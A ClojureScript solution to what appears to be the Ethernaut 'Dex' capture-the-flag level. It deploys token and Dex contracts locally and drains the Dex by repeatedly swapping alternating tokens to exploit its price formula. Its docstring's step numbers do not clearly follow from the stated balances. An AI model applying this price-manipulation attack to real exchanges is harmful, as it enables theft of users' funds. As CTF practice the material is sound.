(ns ctf.ethernaut.dex
  "The amount a trader gets back is:

  `A/B * amount`

  i.e. the Dix balance of the token they give
  divided by token they get back.

  If the traders wants to get back more than he gives.
  The ratio `A/B` (mentioned above) should be > 1.


  To ensure this we alternate the direction of the trade.
  and we make the amount:

  `min(what-player-is-giving-to-dex, what-dex-is-giving-to-player)`

  With the starting balances of 100, 100, 10, 10. The following steps
  will execute:

  min(from.dex, from.player)
  min(token-b.dex, token-b.player) -> (20, 90) -> 20
  min(token-a.dex, token-a.player) -> (86, 24) -> 24
  min(token-b.dex, token-b.player) -> (80, 30) -> 30
  min(token-a.dex, token-a.player) -> (69, 41) -> 41
  min(token-b.dex, token-b.player) -> (45, 65) -> 45"
  (:require [ctf.ethernaut.utils :as u]
            [ctf.ethernaut.wallets :as w]
            [cljs.core.async :as a]
            [cljs.core.async.interop :refer-macros [<p!]])
  (:require-macros [ctf.core :refer [try-async]]))


;; Init the a new wallet for the player
;; Attach it with the local provider
(def player
  (w/get-player! w/local-provider))


(defn deploy-dex!
  "Deploys the Dex contract using the local wallet!
   Returns the `js/Promise`."
  [token1-addr token2-addr]
  (let [contract (u/contract
                  :dex
                  w/local-wallet)]
    (.deploy contract
             token1-addr
             token2-addr)))


(defn deploy-swappable-token!
  "Deploys the Swappable ERC20 Token contract using local wallet!
   Returns the `js/Promise`."
  [name sym initial-supply]
  (let [contract (u/contract
                  :dex/swappable-token
                  w/local-wallet)]
    (.deploy contract
             name
             sym
             initial-supply)))


(defn big-min
  "returns minimum of two BigNumbers"
  [n1 n2]
  (if (.lte n1 n2) n1 n2))


(defn swap
  [dex from-contract to-contract]
  (a/go-loop
      [from-contract     from-contract
       to-contract       to-contract]
    (let [dex-from-balance  (<p! (.balanceOf from-contract (.-address dex)))
          dex-to-balance    (<p! (.balanceOf to-contract (.-address dex)))
          player-balance    (<p! (.balanceOf from-contract (.-address player)))
          amount            (big-min dex-from-balance player-balance)]
      (prn "CURRENT STATE"
           dex-from-balance,
           dex-to-balance,
           amount)
      ;; DEX balances for both tokens should be positive
      ;; for executing the next swap.
      (when (and (.gt dex-from-balance (u/big-num 0))
                 (.gt dex-to-balance (u/big-num 0)))
        (do
          (<p!
           (.approve
            (.connect from-contract player)
            (.-address dex)
            amount))
          (<p!
           (.swap
            (.connect dex player)
            (.-address from-contract)
            (.-address to-contract)
            amount))
          ;; Change the direction of the Swap (from->to, to->from)
          (recur
           to-contract
           from-contract))))))


(defn price-attack
  []
  (try-async
   [token-a (<p!
             (deploy-swappable-token!
              "TokenA"
              "TOKA"
              1000))
    token-b (<p!
             (deploy-swappable-token!
              "TokenB"
              "TOKB"
              1000))
    dex (<p!
         (deploy-dex!
          (.-address token-a)
          (.-address token-b)))]
   (do
     ;; transfer 10 TOKA from local wallet to player
     (<p!
      (.transfer  token-a
                  (.-address player)
                  10))

     ;; transfer 100 TOKA from local wallet to dex
     (<p!
      (.transfer  token-a
                  (.-address dex)
                  100))


     (<p! (.transfer  token-b
                      (.-address player)
                      10))

     ;; transfer 100 TOKB from local wallet to dex
     (<p! (.transfer  token-b
                      (.-address dex)
                      100))


     (swap dex token-a token-b))))



(comment

  ;; execute this code to start the price attack
  (a/take!
   (price-attack)
   #(prn %))

  (-> (u/compile-all!)
      (.then #(.log js/console %))
      (.catch #(.log js/console %)))




  )
